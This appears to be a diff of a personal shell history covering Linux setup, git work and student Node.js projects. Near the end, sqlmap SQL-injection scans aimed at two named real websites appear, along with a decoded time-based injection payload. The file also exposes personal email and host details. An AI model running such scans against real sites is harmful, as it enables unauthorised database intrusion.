+git clone http://2140825@bitbucket.xpto.biz/scm/g8pspeak/phonespeak.git
+sudo subl /etc/modprobe.d/blacklist-camera.conf
 rmmod uvcvideo
 sudo rmmod uvcvideo
-sudo nano /etc/modprobe.d/webcamera.conf 
-exit
-pacman -Ss steam
-sudo pacman -S steam
-steam
-rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/installed/libstdc++6-4.6-pic_4.6.3-1ubuntu5+srt4_amd64 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/installed/libstdc++6-4.6-pic_4.6.3-1ubuntu5+srt4_amd64.md5 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/installed/libstdc++6_4.8.1-2ubuntu1~12.04+steamrt2+srt1_amd64 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/installed/libstdc++6_4.8.1-2ubuntu1~12.04+steamrt2+srt1_amd64.md5 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++_pic.a && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++_pic.map && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/lib/x86_64-linux-gnu/libstdc++.so.6 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.18 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/share/doc/libstdc++6 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/usr/share/doc/libstdc++6-4.6-pic && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/installed/libstdc++6-4.6-pic_4.6.3-1ubuntu5+srt4_i386 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/installed/libstdc++6-4.6-pic_4.6.3-1ubuntu5+srt4_i386.md5 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/installed/libstdc++6_4.8.1-2ubuntu1~12.04+steamrt2+srt1_i386 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/installed/libstdc++6_4.8.1-2ubuntu1~12.04+steamrt2+srt1_i386.md5 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/gcc/i686-linux-gnu/4.6/libstdc++_pic.a && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/gcc/i686-linux-gnu/4.6/libstdc++_pic.map && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/i386-linux-gnu/libstdc++.so.6 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/i386-linux-gnu/libstdc++.so.6.0.18 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/share/doc/libstdc++6 && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/share/doc/libstdc++6-4.6-pic && rm ~/.local/share/Steam/ubuntu12_32/steam-runtime.old/i386/usr/share/doc/libstdc++6
-steam
-history
-steam
-rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/amd64/lib/x86_64-linux-gnu/libgcc_s.so.1 
-steam
-rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/i386-linux-gnu/libxcb.so.1
-steam
-rm ~/.local/share/Steam/ubuntu12_32/steam-runtime/i386/usr/lib/i386-linux-gnu/libstdc++.so.6
-steam
-find ~/.steam/root/ -name "libgpg-error.so*" -print -delete
-steam
-sudo pacman -S gparted
-sudo pacman -S ntfs
-sudo pacman -Ss ntfs
-sudo pacman -S ntfs-3g
-sudo gparted
-sudo pacman -S gtk2 gtk3
-sudo pacman -S libgtop
-sudo pacman -S vlc
-exit
-dd bs=4M if=Downloads/Windows10_InsiderPreview_CoreSingleLanguage_x64_pt-pt_14372.iso of=/dev/sdb status=progress && sync
-pacman -Ss unetbootin
-sudo pacman -S unetbootin
-sudo pacman -S btrf-progs e2fsprogs exfat-utils f2fs-tools jfsutils xfsprogs
-sudo pacman -S btrf-progs exfat-utils f2fs-tools
-sudo pacman -S exfat-utils f2fs-tools
-sudo pacman -S mtools
-unetbootin
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-exit
-sudo modprobe uvcvideo
-cheese
-pacman -S skype
-pacman -Ss skype
-yaourt skype
-dd bs=4M if=Downloads/Hirens.BootCD.15.2/Hiren\'s.BootCD.15.2.iso of=/dev/sdb status=progress && sync
-sudo unetbootin
-timedatectl set-local-rtc 1
-timedatectl 
-grub-mkconfig -o /boot/grub/grub.cfg
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-lsblk
-sudo mount /dev/sda5 /mnt/
-sudo mount -r /dev/sda5 /mnt/
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-yaourt chrome
-sudo nano /etc/default/grub 
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-cat /boot/grub/grub.cfg
-gparted
-sudo gparted
-sudo gparted --help
-sudo pacman -S gtkmm
-sudo pacman -S gtk-engine-murrine
-yaourt numix-themes
-yaourt oomox-git
-yaourt flatplat-theme-arc gnome-breeze-git vertex-themes zuki-themes-git
-yaourt flatplat-theme-arc
-yaourt gnome-breeze-git vertex-themes zuki-themes-git
-yaourt vertex-themes zuki-themes-git
-yaourt vertex-themes
-sudo pacman -S eom
-sudo pacman -S libmtp mtpfs gvfs-mtp
-nemo -r
+cd AndroidStudioProjects/phonespeak
+git fetch
+git push origin master
+git pull
+git clean -d -fx ""
+git pull
+git checkout
+git pull
+git status
+git add .gitignore 
+git status
+git commit -m "add gitignore file"
+git push origin master
+git pull
+git pull origin master
+git status
+git pull origin master
+git rm -r --cached .idea
+git status
+git commit -m "remove .idea folder"
+git push origin master
+git push -f origin master
+git status
+git checkout master
+git checkout 
+git checkout origin
+git push -f origin master
+git status
+git commit -a
+git status
+git add .gitignore 
+sudo apt search messenger
+apt search messengerfordesktop 
+messengerfordesktop --version
+messengerfordesktop --help
+messengerfordesktop 
+git status
+git push -f origin master
+pkill android-studio
+git config user.name 
+pkill nemo
 nemo -q
-sudo pacman -S lxappearence
-sudo pacman -S lxappearance
-lxappearance 
-sudo pacman -Ss gtk-theme-config
-yaourt -Ss gtk-theme-config
-yaourt -S gtk-theme-config
-gtk-theme-config
-sud pacman -S gtk-engines-*
-sudo pacman -Ss gtk-engines-*
-sudo pacman -Ss gtk-engines
-sudo pacman -Ss gtk-engine
-sudo pacman -Ss gtk
-yaourt gtk-engines
-yaourt gtk-engine
-gparted --help
-sudo gparted --help
-lxappearance 
-sudo pacman -S gtk-chtheme
-gtk-chtheme 
-sudo gparted --help
-gtk-chtheme 
-export | grep gtk
-sudo gparted --help
-sudo nano ~/.gtkrc-2.0
-                                     subl3 ~/.config/user-dirs.dirs 
-subl3 ~/.config/user-dirs.locale 
-exit
-journalctl -u vlc
-journalctl -u
-journalctl
-yaourt popcorn
-sudo mv /usr/share/popcorntime-ce/libffmpegsumo.so /usr/share/popcorntime-ce/libffmpegsumo.so.old
-popcorntime-ce 
-sudo mv /usr/share/popcorntime-ce/libffmpegsumo.so.old /usr/share/popcorntime-ce/libffmpegsumo.so
-pacman -S teamviewer
-sudo pacman -Ss teamviewer
-yaourt -Ss teamviewer
-yaourt -S teamviewer
-yaourt teamviewer
-sudo pacman -Syu
-nemo -q
-sudo nano /usr/share/applications/firefox.desktop
-sudo pacman -S lib32-libxenerama
-sudo pacman -Ss lib32-libxenerama
-sudo pacman -Ss lib32-libxe
-sudo pacman -S lib32-libxinerama
-dotfiles/update.pl 
-git config --global user.name "Emanuel Lopes"
-hibernate
-sudo pacman -S hibernate
-acpi -b
-sudo pacman -S laptop-mode-tools
-sudo pacman -Ss laptop-mode-tool
-sudo nano /etc/systemd/logind.conf 
-gsettings set org.gnome.settings-daemon.plugins.power percentage-critical 10
-lsblk
-dmesg 
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-spotify 
-yaourt powerline
-cat ~/.bashrc 
-nano ~/.bashrc 
-pip install poweline-status
-sudo pacman -S python-pip
-pip install poweline-status
-pip install powerline-status
-sudo pip install powerline-status
+sudo apt install cppcheck
+dropbox status
+pkill dropbox 
+dropbox status
+gcc test teste.c 
+gcc -o test teste.c 
+./test 
+gcc -o test teste.c 
+./test 
+ping google.pt
+./gradlew :app:dependencies and ./gradlew :app:androidDependencies.
+uptime
+cat /etc/fstab 
+sudo blkid
+cat /etc/default/grub | grep GRUB_CMDLINE
+cat /etc/default/grub
+subl /boot/grub/grub.cfg 
+subl /etc/default/grub
+sudo subl /etc/default/grub
+sudo update-grub
+sudo subl /etc/default/grub
+sudo update-grub
+sudo subl /etc/initramfs-tools/conf.d/resume 
+sudo blkid
+sudo update-initramfs -u
+spotify --version
+sudo apt update
+sudo apt upgrade
+badblocks -svn /dev/sda
+sudo badblocks -svn /dev/sda
+sudo apt remove laptop-mode-tools
+code
+smartctl --all /dev/sdc | grep Power_On_Hours
+smartctl --all /dev/sda | grep Power_On_Hours
+sudo smartctl --all /dev/sda
+sudo smartctl --all /dev/sda | grep Power_On_Hours
+sudo smartctl --all /dev/sda > ssd.txt
+subl ssd.txt 
+cd MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/
+git clone https://github.com/angular/quickstart.git
+cd quickstart/
+npm install
+npm start
+export ANDROID_HOME=/home/emanuelx/.android-sdk
+./gradlew
+echo $PATH
+echo $PATH
+cd SnapPrefsDOJEMUA/
+git checkout
+cd ..
+cd SnapPrefsDOJEMUA/
+git checkout 
+cd ..
+cd Snapprefs
+git checkout Update_9.39.5 
+iwlist wlan0
+iwlist -i wlan0
+iwlist
+git clone https://github.com/marzika/Snapprefs.git
+set 
+set ANDROID_HOME=/home/emanuelx/.android-sdk
+export  ANDROID_HOME=/home/emanuelx/.android-sdk
+ssh emanuelx.dynip.sapo.pt
+git clone
+git clone https://github.com/Andrerm124/Snapprefs.git
+subl ~/.bashrc
+echo $PATH
+bashrc
 bash
-cd /opt/
-yaourt powerline
-pacman -Ss arduino
-yaourt arduino
-yaourt -S arduino
+ssh emanuelx.dynip.sapo.pt
 lsblk
-sudo mount -r /dev/sda6 /tmp/4QF7KY.mediaplayer-cover 
-lsblk
-sudo umount /dev/sda6
-sudo mkdir -p /media/windows
-sudo mount -r /dev/sda6 /media/windows/
-sudo pacman -Rs nemo
-sudo pacman -Rs nemo-*
-sudo pacman -Rs nemo-fileroller
-sudo pacman -Rs nemo-preview
-sudo pacman -Rs nemo
-sudo pacman -Rs nemo-share
-sudo pacman -R nemo
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-sudo pacman -S os-prober
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-cd dotfiles/
-./update.pl 
-ssh-keygen -t rsa -b 4096 -C "emanuel.lopes.pt@gmail.com"
+sudo apt install gengetopt
+mkdir jajao
+cd jajao/
+subl gengetopt.ggo
+gengetopt gengetopt.ggo 
+gengetopt --help
+gengetopt -C gengetopt.ggo 
+git clone git@github.com:emanuellopes/compressorC.git
+cd jajao/
+gengetopt < gengetopt.ggo 
+subl main.c
+gcc -o jajao main.c 
+gengetopt < gengetopt.ggo 
+gcc -o jajao main.c 
+./jajao 
+
+gcc -o jajao main.c 
+cd ..
+cd EmptyProject-Templatev1.11/
+make
+./prog 
+./prog --help
+./prog
+make
+./prog
+make
+./prog
+./prog -n2
+./prog --help
+make
+./prog ls l 
+./prog cat 
+make
+./prog who
+make
+./prog who
+make
+./prog who
+make
+./prog who
+make
+./prog who
+./prog who ls finger
+./prog ls who
+make
+./prog ls who
+make
+./prog ls who
+./prog who ls who
+./prog ls who
+make
+./prog ls who
+make
+./prog ls who
+make
+./prog ls who
+make
+./prog ls who
+make
+./prog ls who uname
+make
+./prog ls who uname
+make
+./prog ls who uname
+cdmake
+make
+./prog 
+./prog s
+./prog --foler a
+./prog --folder a
+make
+./prog --folder a
+make
+./prog --folder a -n b
+./prog --folder a -n 1
+./prog -n 1
+./prog --folder a -n1
+./prog --folder a -n 1
+make
+./prog --folder a -n 1
+cd ..
+cd gengetOPT/
+make
+make clean all
+./prog
+./prog --help
+make clean all
+./prog --help
+./prog -n 1 -w 1
+make clean all
+./prog -n 1 -w 1
+./prog -n 3 -w 1
+./prog -n 1 -w 1
+make clean all
+./prog -n 1 -w 1
+./prog -n 2 -w 1
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1000
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+make clean all
+./prog -n 3 -w 1
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+make clean all
+./prog -n 3 -w 5
+ping 192.168.5.64
+ps -ef | grep tns
+cd Documentos/sqldeveloper/
+sudo ./sqldeveloper.sh 
+uptime
+dropbox status
+ps -ef | grep tns
+dropbox status
+ssh 192.168.1.50
+ssh 192.168.1.50
+git clone git@localhost:emanuelx/GameDAD.git
+git clone git@emanuelx.dynip.sapo.pt:emanuelx/GameDAD.git
+ssh emanuelx.dynip.sapo.pt
+ssh emanuelx.dynip.sapo.pt
+cd Documentos/game/
+git commit -m "final commit"
+git remote set-url http://emanuelx.dynip.sapo.pt:8080/emanuelx/GameDAD.git
+git remote set-url -add meuserver http://emanuelx.dynip.sapo.pt:8080/emanuelx/GameDAD.git
+git remote set-url --add meuserver http://emanuelx.dynip.sapo.pt:8080/emanuelx/GameDAD.git
+git remote set-url --add origin http://emanuelx.dynip.sapo.pt:8080/emanuelx/GameDAD.git
+git push origin master
+git commit -m "final commit"
+git add .
+git commit -m "final commit"
+git push origin master
 cat ~/.ssh/id_rsa
 cat ~/.ssh/id_rsa.pub 
-ssh -T git@github.com
-./update.pl 
-git config user.name
-nano ~/.netrc
-git config --global credential.helper cache
-git config --global credential.helper 'cache --timeout=3600'
-./update.pl 
-cd
-cat ~/.gitconfig 
-subl3 .netrc
-gpg --encrypt --armor --recipient emanuel.lopes.pt@gmail.com .netrc 
-gpg --gen-key
-gpg --list-secret-keys --keyid-format LONG
-gpg --armor --export F605BAAA191AFDBE
-gpg --encrypt --armor --recipient emanuel.lopes.pt@gmail.com .netrc
-gpg --list-secret-keys --keyid-format LONG
-gpg --encrypt --armor --recipient "Emanuel Lopes" .netrc
-git config --global credential.helper "netrc -f ~/.netrc.asc -v"
-cat .netrc
-cat .netrc.asc 
-mv teste.netrc.teste
-mv .netrc teste.netrc.teste
-sudo rm xorg.conf.new 
-yaourt tor
-yaourt tor-browser
-gpg
-gpg --help
-sudo pacman-key -r 2E1AC68ED40814E0
-pacman-key --help
-pacman-key -lsign-key 2E1AC68ED40814E0
-pacman-key --lsign-key 2E1AC68ED40814E0
-sudo pacman-key --lsign-key 2E1AC68ED40814E0
-sudo pacman-key -r 2E1AC68ED40814E0
-yaourt tor-browser-en
-gpg --keyserver pool.sks-keyservers.net --recv-keys 2E1AC68ED40814E0 
-yaourt tor-browser-en
-yaourt -Syu
-yaourt -Syua
-journalctl --help
-journalctl -k
-journalctl --help
-journalctl --user
-journalctl --system
-journalctl --help
-journalctl --system -since=25-07-2015
-journalctl --system --since=25-07-2015
-journalctl --system --since=25/07/2015
-journalctl --system --since=07-25-2015
-journalctl --system --since=07-25-2015 01:00:00
-journalctl --system --since="07-25-2015 01:00:00"
-journalctl --system --since="2015-07-25 01:00:00"
-journalctl --system --since "2015-07-25 01:00:00"
-journalctl --since "2015-07-25 01:00:00"
-journalctl --since "2015-07-25 14:00:00"
-journalctl --since "2015-07-25"
-sudo pacman -S sqlmap
+ssh -T git@emanuelx.dynip.sapo.pt:8080
+ssh -T git@emanuelx.dynip.sapo.pt
+cd Documentos/game
+git remote update
+git remote -v
+git push both
+git push 
+git commit -m "sksm"
+git push 
+git checkout
+git commit -m "sksm"
+git status
+git add js/main.js 
+git status
+git remote -v
+git status
+git remote -v
+git push origin master
+git status
+git commit -m "sksm"
+git push origin master
+git push 
+git remote set-url --add --push origin git://somewhere/something.git
+git commit -m "sksm"
+git add js/main.js 
+git commit -m "sksm"
+git push origin
+git push origin master
+git commit -m "sksm"
+git add js/main.js 
+git commit -m "ola novo update para os dois repos"
+git push origin
+git remote -v
+git remote add gogs git@emanuelx.dynip.sapo.pt:emanuelx/GameDAD.git
+git remote -v
+git remote set-url --add --push origin git@emanuelx.dynip.sapo.pt:emanuelx/GameDAD.git
+git remote -v
+git add js/main.js 
+git commit -m "ola teste"
+git push origin
+git add js/main.js 
+git commit -m "ola teste 2"
+git push origin master
+git remote add both me@original:something.git
+git remote set-url --add --push both git://somewhere/something.git
+git remote -v
+git add js/main.js 
+git commit -m "ola teste 3"
+git push both master
+pkill messengerfordesktop 
+sudo add-apt-repository ppa:nilarimogard/webupd8
+sudo pat update
+sudo apt update
+sudo apt search prime-indicator
+sudo apt install prime-indicator-plus
+sudo apt search bbswitch
+prime-indicator
+whereis prime-select
+cat /usr/bin/prime-select 
+cat .scripts/intel_prime.sh 
+tee /proc/acpi/bbswitch <<< OFF &>/dev/null
+sudo tee /proc/acpi/bbswitch <<< OFF &>/dev/null
+git clone https://github.com/treehouse/android-navigation-drawer-final.git
+cat /etc/hosts
+uname .a
+uname -a
+sudo apt update
+sudo apt upgrade
+git clone git@emanuelx.dynip.sapo.pt:emanuelx/GameDAD.git
+subl js/main.js 
+git add js/main.js 
+git commit -m "teste drive"
+git push both
+git push origin both
+git remote -
+git push origin master
+sudo apt dist-upgrade
+cat /var/log/Xorg.0.log | grep EE
+reboot
+~/.scripts/intel_prime.sh intel
+sudo ~/.scripts/intel_prime.sh intel
+cat /etc/X11/xorg.conf.d/20-intel.conf
+sudo subl /etc/X11/xorg.conf.d/20-intel.conf
+cd Documentos/sqldeveloper/
+sudo ./sqldeveloper.sh 
+sudo apt update
+sudo apt list --upgradable
+sudo apt upgrade
+cd MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/
+cd node
+npm install concat-stream
+node index.js 
+node index.js ola
+nodejs index.js ola
+node index.js ola
+node index.js ola s
+node index.js ola
+node console.log("ss");
+node console.log("ss")
+node console
+node index.js undefined
+node index.js undefinesdssddssd
+npm install express
+cd ..
+cd node2/
+node index.js
+cd angular/
+npm install
+node index.js
+cd ..
+node index.js
+cd ../node3
+npm install restify
+node index.js 
+cd angular/
+npm install
+cd ..
+node index.js 
+cd ..
+node index.js 
+cd node3/
+node index.js 
+cd angular/
+tsc -w
+npm install
+tsc -w
+nodejs run tsc -w
+node run tsc
+node run tsc:w
+npm run tsc:W
+npm run tsc:w
+cd ..
+cd angular-2/
+npm install
+npm run tsc:w
+cd MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/node3/
+node index.js 
+cd sqldeveloper/
+sqldeveloper
+wget http://mapas.hidrografico.pt/geoserver/psoemm/ows?service=wms&version=1.3.0&request=GetCapabilities
+rm ows\?service\=wms 
+xit
+cd Documentos/sqldeveloper/
+sudo ./sqldeveloper.sh 
+sudo unzip Dropbox/DAD_SHARED/sqldeveloper.zip  -d /opt/
+sudo chmod +x /opt/sqldeveloper/sqldeveloper.sh
+sudo ln -s /opt/sqldeveloper/sqldeveloper.sh /usr/local/bin/sqldeveloper
+sudo subl /opt/sqldeveloper/sqldeveloper.sh
+/usr/local/bin/sqldeveloper
+sudo /usr/local/bin/sqldeveloper
+sudo subl /opt/sqldeveloper/sqldeveloper.sh
+bash
+/usr/local/sqldeveloper
+/usr/local/bin/sqldeveloper
+cd /usr/share/applications/
+sudo subl sqldeveloper.desktop
+sudo update-desktop-database 
+sudo ls -l /opt/sqldeveloper/
+cd /opt/sqldeveloper/
+sudo /opt/sqldeveloper/
+sudo cd /opt/sqldeveloper/
+cd /opt/
+cd sqldeveloper/
+sudo cd sqldeveloper/
+sudo -s
+wget http://mapas.hidrografico.pt/geoserver/psoemm/ows?service=wms&version=1.3.0&request=GetCapabilities
+curl http://mapas.hidrografico.pt/geoserver/psoemm/ows?service=wms&version=1.3.0&request=GetCapabilities
+git clone https://github.com/angryelectron/thingspeak-java.git
+cd thingspeak-java/
+ant
+sudo apt install ant
+ant
+cd dist/lib/
+cd ..
+java -jar thingspeak-1.1.1.jar 
+uptime
+sudo apt install virtualbox
+sudo apt install virtualbox-qt -y
+ls ~/.cache/spotify/Storage/
+ls -l  ~/.cache/spotify/Storage/
+ls -l  ~/.cache/spotify/Storage/fe/
+sudo apt update
+sudo apt upgrade
+cd /opt/sqldeveloper/
+sudocd /opt/sqldeveloper/
+sudo -s
+/opt/sqldeveloper/sqldeveloper.sh 
+sudo apt update
+cd Documentos/
+git clone git@github.com:emanuellopes/compressorC.git
+ssh emanuelx.dynip.sapo.pt
+cd /opt/sqldeveloper/
+./sqldeveloper.sh 
+sudo -s
+sudo apt search spotify
+git clone https://github.com/PhilJay/MPAndroidChart.git
+ssh emanuelx.dynip.sapo.pt
+ssh -D 80 emanuelx.dynip.sapo.pt
+sudo ssh -D 80 emanuelx.dynip.sapo.pt
+sudo ssh -D 80 emanuelx@emanuelx.dynip.sapo.pt
+ssh -L 80:localhost:80 emanuelx@emanuelx.dynip.sapo.pt
+sudo ssh -L 80:localhost:80 emanuelx@emanuelx.dynip.sapo.pt
+ssh -2 -R 22333:127.0.0.1:22333 -A -D 80 emanuelx@emanuelx.dynip.sapo.pt
+sudo ssh -2 -R 22333:127.0.0.1:22333 -A -D 80 emanuelx@emanuelx.dynip.sapo.pt
+sudo apt install transmission
+transmission-gtk 
+sudo nano /etc/X11/xorg.conf.d/20-intel.conf
+cat /etc/X11/xorg.conf.d/20-intel.conf
+sudo add-apt-repository ppa:wfg/0ad
+sudo apt update
+sudo apt install 0ad
+sudo ssh -D 80 emanuelx@emanuelx.dynip.sapo.pt
+uptime
+sudo apt search i3
+sudo apt install i3-wm
+sudo apt install i3
+poweroff
+git clone git@github.com:emanuellopes/dotfiles.git
+sqldeveloper 
+sudo netbeans 
+sudo chown emanuelx Transferências/ideaIU-2016.2.5.tar.gz 
+sudo -s
+cd .apps/idea-IU/
+cd ./bin/
+./idea.sh 
+sudo nemo
+cd .apps/idea-IU/
+cd bin/
+cat idea.sh 
+nemo -q
+sudo nemo
+sudo chown emanuelx Academic\ Management.zip 
+sudo chown emanuelx Transferências/PhpStorm-2016.2.2.tar.gz 
+cd .apps/PhpStorm/
+cd /bin/
+cd ..
+cd ~/.apps/PhpStorm/bin/
+./phpstorm.sh 
+cat ~/.i3/config 
+sudo apt search i3wm
+sudo apt search i3
+cat ~/.i3/config 
+sudo apt install i3-status
+sudo apt install i3status
+subl ~/.i3/config 
+sudo apt install conky
+sudo apt install rofi
+logout 
+gnome-session-quit 
+sudo gnome-session-quit 
+sudo gnome-session-save --foce-logout
+sudo gnome-session-save --force-logout
+cinnamon-session-quit 
+systemctl mdm restart
+i3status 
+sudo apt search i3bar
+sudo apt search i3-bar
+reboot
+sqldeveloper 
+sudo -s
+sqldeveloper 
+sudo -s
+sqldeveloper 
+sqldeveloper
+sudo -s
+sqldeveloper 
+apt install mongodb
+systemctl start mongodb
+systemctl status mongodb
+cat /etc/mongodb.conf 
+cd /opt/
+wget https://download.robomongo.org/0.9.0/linux/robomongo-0.9.0-linux-x86_64-0786489.tar.gz
+tar -xvf robomongo-0.9.0-linux-x86_64-0786489.tar.gz 
+mv robomongo-0.9.0-linux-x86_64-0786489 robomongo
+rm -rf robomongo-0.9.0-linux-x86_64-0786489.tar.gz 
+robomongo/bin/robomongo 
+ln -s /opt/robomongo/bin/robomongo /usr/local/bin/robomongo
+robomongo
+cd robomongo/
+wget http://2.bp.blogspot.com/-VxxkwccPn9g/VRjbpBxlikI/AAAAAAAAAkE/uygLLK_NFuA/s1600/Icon_MongoDB_by_xkneo.png -o icon.png
+subl /usr/share/applications/robomongo.desktop 
+gimp icon.png 
+wget http://2.bp.blogspot.com/-VxxkwccPn9g/VRjbpBxlikI/AAAAAAAAAkE/uygLLK_NFuA/s1600/Icon_MongoDB_by_xkneo.png
+mv Icon_MongoDB_by_xkneo.png icon.png
+cd /opt/
+sudo -s
+cd /usr/share/applications/
+subl sublime_text.desktop 
+sqldeveloper 
+sudo -s
+sudo -s
+cd ~/MEOCloud/Escola/3º\ ano/
+cd Desenvolvimento\ de\ aplicações\ distribuidas/mongoDB/
+npm init
+npm install mongodb --save
+npm install mongodb
+npm install 
+npm install node
+npm install mongodb
+npm init -
+npm install mongodb --save
+npm install mongodb
+npm init
+npm install mongodb --save
+cd ../mongoDB_teste/
+npm install mongodb --save
+npm init
+npm install mongodb --save
+npm start
+node index.js 
+subl /etc/mongodb.conf 
+ls /var/lib/mongodb/
+sudo apt install robomongo
+sudo apt search  robomongo
+sudo apt search  mongo
+sudo cd /opt/
+sudo -s
+robomongo 
+sudo subl /usr/share/applications/sqldeveloper.desktop 
+sudo cp /usr/share/applications/sqldeveloper.desktop /usr/share/applications/robomongo.desktop
+sudo subl /usr/share/applications/robomongo.desktop
+ls /opt/robomongo/
+ls /opt/robomongo/bin/
+ls /opt/robomongo/lib/
+ls /opt/robomongo/lib/imageformats/l
+ls /opt/robomongo/lib/imageformats/
+ls /opt/robomongo/
+cd ~/MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/mongoDB_teste/
+node mongo1.js 
+node mongo1.js
+cd ..
+pwd
+cd mongo_ex2/
+npm install mongodb
+node index.js 
+npm install
+node i
+npm install restify
+node index.js 
+cd ../mongo_ex3
+npm install passport
+npm instal passport-local
+npm install passport-local
+sudo -s
+sqldeveloper 
+uptime
+udo -s
+sudo -s
+cat /etc/modprobe.d/iwlwifi.conf 
+cp /home/emanuelx/dotfiles/etc/modprobe.d/asus_wifi.conf /etc/modprobe.d/
+iw dev wlan0 set power_save on
+cp /home/emanuelx/dotfiles/etc/modprobe.d/ath9k.conf /etc/modprobe.d/
+systemd-analyze 
+systemd-analyze blame
+systemd-analyze blame > systemd.txt
+subl systemd.txt 
+systemctl list-dependencies multi-user.target |grep Modem
+systemctl disable ModemManager.service 
+cat /etc/init.d/mongodb 
+sudo update-rc.d mongodb remove
+cat /etc/init.d/mongodb 
+sudo update-rc.d -f mongodb remove
+cat /etc/init.d/mongodb 
+ls /etc/init.d/
+ufw 
+sudo apt purge ufw
+apt update
+apt upgrade
+cat /etc/X11/xorg.conf.d/20-intel.conf
+systemd-analyze blae
+systemd-analyze blame
+powertop 
+sudo powertop 
+sudo -s
+powertop 
+sudo powertop 
+powertop 
+sudo powertop 
+cd Transferências/Popcorn-Time-linux64/
+./Popcorn-Time 
+apt search libudev.so.0
+apt search libudev.so
+sudo apt install libudev
+sudo apt-get install libudev0:i386
+./Popcorn-Time 
+ps -aux
+sensors
+inxi
+lspci -vnnn | perl -lne 'print if /^\d+\:.+(\[\S+\:\S+\])/' | grep VGA
+sudo apt install powerstat powertop preload prelink
+powerstat 
+preload 
+prelink
+sudo powertop --help
+sudo powertop -c
+sudo add-apt-repository ppa:colingille/freshlight
+sudo apt search winusb
+sudo apt install winusb
+lsblk
+dd if=/dev/zero of=/dev/sdb bs=512 count=1 conv=notrunc
+sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1 conv=notrunc
+sudo neo
+sudo nemo
+sudo chown emanuelx Academic\ Management/
+sudo chown -r emanuelx Academic\ Management/
+sudo chown -R emanuelx Academic\ Management/
+sudo chown emanuelx -R Academic\ Management/
+sudo chown emanuelx -R MEOCloud/Escola/3º\ ano/DAE/AcademicManagement/
+sudo nemo
 sqlmap --help
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=ola"
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
-sqlmap -u "http://supra.pt/?section=product&sub=view&product_id=1" -p "product_id" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
+sudo apt update
+sudo apt upgrade
+sudo apt search sqlmap
+sudo apt install sqlmap
+echo "MScgQU5EIFNMRUVQKDUpIw==" | base -d
+echo "MScgQU5EIFNMRUVQKDUpIw==" | base64 -d
+echo "YTo0OntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjM6Im1pZCI7YToyOntpOjA7czozOiIzNjUiO2k6MTtzOjM6IjU4OSI7fXM6MzoiY2lkIjtzOjM6IjU4OSI7czoxMzoidmVyc2FvX3RhYmVsYSI7czo2OiJvbmxpbmUiO30=" | base64 -d
 sqlmap --help
